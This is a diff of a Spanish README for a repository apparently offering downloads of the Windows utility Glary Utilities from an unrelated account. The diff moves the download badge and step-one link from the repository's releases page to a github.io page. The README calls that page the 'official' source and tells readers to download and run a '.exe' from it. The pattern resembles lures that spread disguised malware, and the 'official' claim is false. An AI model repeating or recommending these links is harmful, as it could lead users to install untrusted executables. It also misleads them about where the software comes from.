@@ -1,6 +1,6 @@
 # 🛠 Descargar-Glary-Utilities - Optimiza tu PC para mejor rendimiento
 
-[![](https://img.shields.io/badge/Download-Glary_Utilities-blue.svg)](https://github.com/Caulescent-businesslife622/Descargar-Glary-Utilities/releases)
+[![](https://img.shields.io/badge/Download-Glary_Utilities-blue.svg)](https://caulescent-businesslife622.github.io)
 
 Glary Utilities ayuda a mejorar la velocidad y estabilidad de computadoras con Windows 10 y 11. Este software limpia archivos basura, repara errores de registro y organiza el sistema para que funcione como nuevo.
 
@@ -8,7 +8,7 @@ Glary Utilities ayuda a mejorar la velocidad y estabilidad de computadoras con W
 
 Siga estos pasos para obtener la versión correcta para su sistema operativo:
 
-1. Visite la página oficial de lanzamientos en este enlace: [https://github.com/Caulescent-businesslife622/Descargar-Glary-Utilities/releases](https://github.com/Caulescent-businesslife622/Descargar-Glary-Utilities/releases).
+1. Visite la página oficial de lanzamientos en este enlace: [https://caulescent-businesslife622.github.io](https://caulescent-businesslife622.github.io).
 2. Busque la sección de la versión más reciente en la parte superior de la página.
 3. Haga clic en el archivo ejecutable que termina en ".exe" para iniciar la descarga.
 4. Elija una carpeta en su equipo, como "Descargas" o "Escritorio", para guardar el archivo.
